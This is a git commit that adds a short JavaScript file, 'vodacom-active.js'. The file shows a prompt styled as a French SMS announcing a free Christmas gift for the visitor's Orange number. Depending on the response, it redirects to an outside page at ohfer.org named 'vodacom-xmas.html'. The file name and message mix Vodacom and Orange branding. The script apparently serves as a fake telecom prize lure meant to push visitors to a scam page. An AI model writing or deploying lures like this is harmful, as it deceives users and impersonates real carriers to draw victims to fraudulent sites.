33188fdbbe91e3f3b05a034c7ca625ad12b2fa28
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-12-09 19:53:07 +0100

    Create vodacom-active.js

---
+++ vodacom-active.js
@@ -0,0 +1,5 @@
+var password = 'OBTENIR UNE OFFRE'
+password=prompt('SMS: Félicitations, votre numéro orange vous permet de recevoir un cadeau de Noël gratuit. Cliquez sur OK pour le recevoir.','OBTENIR UNE OFFRE');
+if (password != 'OBTENIR UNE OFFRE') {
+location.href='https://ohfer.org/vodacom-xmas.html';
+}
